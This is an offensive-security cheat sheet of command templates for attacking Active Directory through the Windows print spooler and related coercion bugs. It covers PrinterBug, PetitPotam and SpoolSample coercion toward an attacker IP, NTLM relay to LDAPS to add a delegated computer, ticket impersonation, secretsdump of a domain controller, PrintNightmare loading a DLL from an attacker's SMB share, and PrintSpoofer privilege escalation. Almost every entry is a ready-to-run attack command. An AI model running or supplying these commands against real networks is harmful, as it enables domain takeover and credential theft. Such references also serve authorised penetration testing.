# Printerbug and Petitpotam

% printerbug, petitpotam, Active directory

## Finding Spooler services listening
#plateform/linux  #target/remote #cat/RECON 
```
impacket-rpcdump <DOMAIN>/<USER>:'<PASSWORD>'@<DC> | grep MS-RPRN
```

## Finding Spooler services anonymous
#plateform/linux  #target/remote #cat/RECON 
```
impacket-rpcdump <DC> | grep -A 6 MS-RPRN
```

## dementor
#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
https://github.com/NotMedic/NetNTLMtoSilverTicket

```
dementor.py -d <DOMAIN> -u <USER> -p <PASSWORD> <attacker_ip> <DC>
```

## printerbug
#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py

```
printerbug.py '<DOMAIN>/<USER>:<PASSWORD>'@<IP> <attacker_ip>
```

## webclientservicescanner
#plateform/linux  #target/remote #cat/RECON
https://github.com/Hackndo/WebclientServiceScanner
```
webclientservicescanner '<DOMAIN>/<USER>:<PASSWORD>'@<ip_range>
```

## PetitPotam
#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT
https://github.com/topotam/PetitPotam
```
PetitPotam.py -u <USER> -p '<PASSWORD>' -d <DOMAIN> <listener> <target>
```

## impacket-ntlmrelayx add computer
#plateform/linux  #target/remote #cat/ATTACK/MITM 
```
impacket-ntlmrelayx -t ldaps://<DC> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
```

## use silver ticket
#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
```
impacket-getST -spn host/<DC> -impersonate <user_to_impersonate> -dc-ip <dc_ip> '<DOMAIN>/<computer_name>$:<computer_password>'
```

## secret dump with kerberos
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
impacket-secretsdump -k <DC>
```

## PrintNightmare
#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT
https://github.com/cube0x0/CVE-2021-1675

- windows server 2019
  container_info['DriverInfo']['Level2']['pDriverPath']  = 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\x00'
- windows server 2016          
  container_info['DriverInfo']['Level2']['pDriverPath']  = 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_db4f0d0030e708f4\\Amd64\\UNIDRV.DLL\x00'

Need a real smb server (not work with the impacket server)

```
CVE-2021-1675.py <DOMAIN>/<USER>:<PASSWORD>@<target_ip> '\\<attacker_ip>\<share_name>\<dll_name|inject>.dll'
```

## Printspoofer privesc
#plateform/windows  #target/local #cat/ATTACK/EXPLOIT

https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/PrintSpoofer.NET

```
PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss <launch_cmd>
```

## Spoolsample launch pipe
#plateform/windows  #target/remote #cat/ATTACK/EXPLOIT
```
SpoolSample.exe <target_hostname> <target_hostname>/pipe/test
```

## Spoolsample
#plateform/windows  #target/remote #cat/ATTACK/EXPLOIT

coherced authentitication 

```
SpoolSample.exe <target_server> <capture_server> 
```
